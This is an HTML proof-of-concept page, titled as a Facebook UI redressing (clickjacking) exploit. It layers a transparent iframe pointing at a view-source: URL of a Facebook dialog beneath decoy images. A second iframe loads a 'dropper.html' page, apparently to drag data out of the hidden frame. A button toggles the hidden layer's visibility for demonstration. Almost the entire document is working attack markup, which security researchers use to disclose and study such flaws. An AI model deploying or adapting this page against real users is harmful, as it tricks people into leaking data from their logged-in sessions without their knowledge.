<html>
	<head>
		<title>UI Redressing Mayhem - Facebook Proof of Concept Exploit</title>

		<script>

			function setTroll() {
				document.getElementById('maya').src = 'troll.png';
				document.getElementById('facebook').src = 'fb_red.png';
			}
			
			function showTheMagic() {
			
				if(document.getElementById('bottom').style.opacity == 0)
					document.getElementById('bottom').style.opacity = '0.3';
				else
					document.getElementById('bottom').style.opacity = '0.0';
			}
			
		</script>
	</head>

	<body>

		<input type='submit' value='show me the magic' onclick='showTheMagic()'/>
			
		<div style='position:fixed; top:20px'>
		
			<div id="bottom" style="opacity:0.0;z-index:1;position:fixed;width:60%;height:100%" align='center'>
			
				<iframe id="content" style="position:fixed;top:23px;left:530px;" src="view-source:view-source:http://www.facebook.com/ajax/intl/language_dialog.php" width="50%" height="200px" scrolling='auto'></iframe>

				<iframe onmouseover='setTroll()' style="position:fixed;top:280px" src="dropper.html" width="40%" height="40%" ></iframe>
						
			</div>
				
			<div id="top" style="opacity:1.0;z-index:-1;position:fixed;width:90%;height:100%" align='center'>
			
				<img src="facebook.png" id="facebook" width='8%'/>				
				<br/>
				<img style="position:fixed;top:330px" src="maya.png" id="maya" />				
			</div>
		</div>
	</body>
</html>
